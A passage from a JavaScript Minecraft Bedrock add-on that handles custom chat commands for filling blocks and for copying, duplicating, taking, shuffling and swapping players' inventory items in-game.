")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^iongfill$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        system.run(() => { let a = fillBlocksC(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, matchingblock?.[0], matchingblock?.[1], true); player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled`); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ifillb$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? BlockPermutation.resolve("air") : BlockPermutation.resolve(lastblockname, lastblockstates); /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        system.run(() => { let a = fillBlocksB(coordinatesa, coordinatesb, player.dimension, BlockPermutation.resolve(firstblockname, firstblockstates), { matchingBlock: matchingblock }); player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled`); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^cloneitem$/):
                {
                    eventData.cancel = true;
                    system.run(() => {
                        let args = evaluateParameters(switchTestB, ["presetText", "targetSelector"]).args;
                        if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                            args[1] = player.name;
                        }
                        if ((switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                            args[1] = player.name;
                        }
                        let target = targetSelectorAllListC(args[1], "", vTStr(player.location), player).find(v => v.typeId == "minecraft:player");
                        if (!!!target) {
                            player.sendMessage(`§cError: No player matching the specified target selector was found. `);
                        }
                        else {
                            target.getComponent("inventory").container.addItem(player.getComponent("inventory").container.getItem(event.sender.selectedSlot)?.clone());
                        }
                    });
                }
                break;
            case !!switchTest.match(/^copyitem$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[2].trim() == "~") {
                        args[2] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[2].trim() ?? "") == "") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        if (switchTestB.split(/\s+/g)[1].trim() == "~") {
                            args[1] = target.selectedSlot;
                        }
                        let slot = getSlotFromParsedSlot(parseSlot(args[1]), { container: target?.getComponent("inventory")?.container, equipment: target?.getComponent("equippable"), selectedSlot: target?.selectedSlot });
                        system.run(() => {
                            if (String(args[1]).match(/^\d+$/)) {
                                target.getComponent("inventory").container.setItem(Number(args[1]), player.getComponent("inventory").container.getItem(player.selectedSlot));
                            }
                            else {
                                slot.setItem(player.getComponent("inventory").container.getItem(player.selectedSlot));
                            }
                            player.sendMessage(`Successfully copied item to slot ${args[1]} of ${target.name}'s inventory. `);
                        });
                    }
                }
                break;
            case !!switchTest.match(/^dupeitem$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[1].trim() == "~" || (switchTestB.split(/\s+/g)[1].trim() ?? "") == "") {
                        args[1] = player.selectedSlot;
                    }
                    let slot = getSlotFromParsedSlot(parseSlot(args[1]), { container: player?.getComponent("inventory")?.container, equipment: player?.getComponent("equippable"), selectedSlot: player?.selectedSlot });
                    system.run(() => {
                        if (String(args[1]).match(/^\d+$/)) {
                            player.getComponent("inventory").container.addItem(player.getComponent("inventory").container.getItem(Number(args[1])));
                        }
                        else {
                            player.getComponent("inventory").container.addItem(slot.getItem());
                        }
                        player.sendMessage(`Successfully duped item in slot ${String(args[1])}. `);
                    }); /*
                    system.run(()=>{let slot = [EquipmentSlot.Head, EquipmentSlot.Chest,  EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][["head", "chest", "legs", "feet", "mainhand", "offhand", "helmet", "chestplate", "leggings", "boots", "hand", "otherhand", "cap", "tunic", "pants", "shoes", "righthand", "lefthand"].findIndex(v=>v==switchTestB.split(" ")[1]?.trim()?.toLowerCase())%6]??Number((!!!switchTestB.split(" ")[1]?.trim()?"~":switchTestB.split(" ")[1].trim()).replaceAll("~", String(player.selectedSlot))); let fromSlot = typeof slot == "string"?player.getComponent("equippable").getEquipmentSlot(slot):player.getComponent("inventory").container.getSlot(slot); player.getComponent("inventory").container.addItem(player.getComponent("inventory").container.getItem(event.sender.selectedSlot).clone())})*/
                }
                break;
            case !!switchTest.match(/^transferitem$/):
                {
                    eventData.cancel = true;
                    system.run(() => {
                        let args = evaluateParameters(switchTestB, ["presetText", "targetSelector"]).args;
                        if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                            args[1] = player.name;
                        }
                        if ((switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                            args[1] = player.name;
                        }
                        let target = targetSelectorAllListC(args[1], "", vTStr(player.location), player).find(v => v.typeId == "minecraft:player");
                        if (!!!target) {
                            player.sendMessage(`§cError: No player matching the specified target selector was found. `);
                        }
                        else {
                            player.getComponent("inventory").container.transferItem(player.selectedSlot, target.getComponent("inventory").container);
                        }
                    });
                }
                break;
            case !!switchTest.match(/^shuffleinventory$/) || !!switchTest.match(/^invshuffle$/):
                {
                    eventData.cancel = true;
                    system.run(() => {
                        let args = evaluateParameters(switchTestB, ["presetText", "targetSelector"]).args;
                        if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                            args[1] = player.name;
                        }
                        let targets = targetSelectorAllListC(args[1], "", vTStr(player.location), player).filter(v => v.typeId == "minecraft:player");
                        if (targets.length == 0) {
                            player.sendMessage(`§cError: No player matching the specified target selector was found. `);
                        }
                        else {
                            let successes = [];
                            targets.forEach(target => {
                                try {
                                    let items = shuffle(containerToItemStackArray(target.getComponent("inventory").container));
                                    containerToContainerSlotArray(target.getComponent("inventory").container).forEach((s, i) => { s.setItem(items[i]); });
                                    successes.push(target);
                                }
                                catch (e) {
                                    player.sendMessage(e + " " + e.stack);
                                }
                            });
                            if (successes.length == 0) {
                                player.sendMessage(`§cError: Some other error occured and no inventories were successfully shuffled. `);
                            }
                            else {
                                player.sendMessage(`Successfully shuffled the ${successes.length == 1 ? "inventory" : "inventories"} of ${successes.map(v => v.name).join(", ")}. `);
                            }
                        }
                    });
                }
                break;
            case !!switchTest.match(/^swapitems$/):
                {
                    eventData.cancel = true;
                    system.run(() => {
                        let args = evaluateParameters(switchTestB, ["presetText", "presetText", "presetText", "targetSelector", "targetSelector"]).args;
                        if ((args[4] ?? "").trim() == "") {
                            args[4] = player.name;
                        }
                        else {
                            if ((args[4] ?? "").trim() == "~") {
                                args[4] = player.name;
                            }
                        }
                        if ((args[3] ?? "").trim() == "") {
                            args[3] = player.name;
                        }
                        else {
                            if ((args[3] ?? "").trim() == "~") {
                                args[3] = player.name;
                            }
                        }
                        let target = targetSelectorAllListC(args[1], "", vTStr(player.location), player).find(v => v.typeId == "minecraft:player");
                        let targetb = targetSelectorAllListC(args[1], "", vTStr(player.location), player).find(v => v.typeId == "minecraft:player");
                        if ((args[2] ?? "").trim() == "") {
                            args[2] = targetb?.selectedSlot;
                        }
                        if ((args[1] ?? "").trim() == "") {
                            args[1] = target?.selectedSlot;
                        }
                        if (!!!target) {
                            player.sendMessage(`§cError: No player matching the first specified target selector was found. `);
                        }
                        else if (!!!targetb) {
                            player.sendMessage(`§cError: No player matching the second specified target selector was found. `);
                        }
                        else {
                            system.run(() => { target.getComponent("inventory").container.swapItems(Number(args[1].replace(/^~$/, String(target.selectedSlot))), Number(args[2].replace(/^~$/, String(targetb.selectedSlot))), targetb.getComponent("inventory").container); });
                            player.sendMessage(`Successfully swapped slot ${args[1]} of ${target.name}'s inventory with slot ${args[2]} of ${targetb.name}'s inventory. `);
                        }
                    });
                }
                break;
            case !!switchTest.match(/^clear$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "string", "presetText", "number", "number"], switchTestB).args;
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        let itemType = new ItemStack(args[2].trim(), 1).typeId;
                        if ((args[2] ?? "") == "") {
                            system.run(() => { containerToContainerSlotArray(target.getComponent("inventory").container).forEach(v => v.setItem()); });
                        }
                        else {
                            system.run(() => { containerToContainerSlotArray(target.getComponent("inventory").container).filter(v => v.typeId == itemType).forEach(v => v.setItem()); });
                        }
                    }
                }
                break;
            case !!switchTest.match(/^takeitem$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[2].trim() == "~") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        if (switchTestB.split(/\s+/g)[1].trim() == "~") {
                            args[1] = target.selectedSlot;
                        }
                        let slot = getSlotFromParsedSlot(parseSlot(args[1]), { container: target?.getComponent("inventory")?.container, equipment: target?.getComponent("equippable"), selectedSlot: target?.selectedSlot });
                        system.run(() => {
                            if (String(args[1]).match(/^\d+$/)) {
                                target.getComponent("inventory").container.transferItem(Number(args[1]), player.getComponent("inventory").container);
                            }
                            else {
                                player.getComponent("inventory").container.addItem(slot.getItem());
                                slot.setItem();
                            }
                            player.sendMessage(`Successfully took item from ${args[2]}'s inventory. `);
                        });
                    }
                }
                break;
            case !!switchTest.match(/^swapinventories$/) || !!switchTest.match(/^invswap$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "string", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                        args[1] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                        args[1] = player.name;
                    }
                    if (switchTestB.split(/\s+/g)[2]?.trim() == "~") {
                        args[2] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[2] ?? "").trim() == "") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[1]);
                    let targetb = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[1]}. `);
                    }
                    else if (!!!targetb) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        system.run(() => {
                            inventorySwap(target, targetb);
                            player.sendMessage(`Successfully swapped ${args[1]}'s inventory with ${args[2]}'s inventory. `);
                        });
                    }
                }
                break;
            case !!switchTest.match(/^swapinventoriesb$/) || !!switchTest.match(/^invswapb$/):
                {
                    eventData.cancel = true;
                    system.run(() => { inventorySwapB(world.getAllPlayers().find(_ => _.name == switchTestB.split("\"")[1]).getComponent("inventory").container, world.getAllPlayers().find(_ => _.name == switchTestB.split("\"")[3]).getComponent("inventory").container); });
                }
                break;
            case !!switchTest.match(/^compressitems$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[2]?.trim() == "~") {
                        args[2] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[2] ?? "").trim() == "") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        if ((args[1] ?? "").trim() == "" || (args[1] ?? "").trim() == "all") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("chest"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 27], [0, 27]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Items: Slots 0-26§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [27, 36], [0, 27]); [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); }); let item2 = block.getItemStack(1, true); item2.nameTag = `§r§a${target.name}'s Items: Slots 27-35, Armor, and Offhand\n§b${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); target.getComponent("inventory").container.addItem(item2); });
                        }
                        else if ((args[1] ?? "").trim() == "inventory") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("chest"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [9, 36], [0, 27]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Items: Slots 9-35§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                        else if ((args[1] ?? "").trim() == "hotbar") {
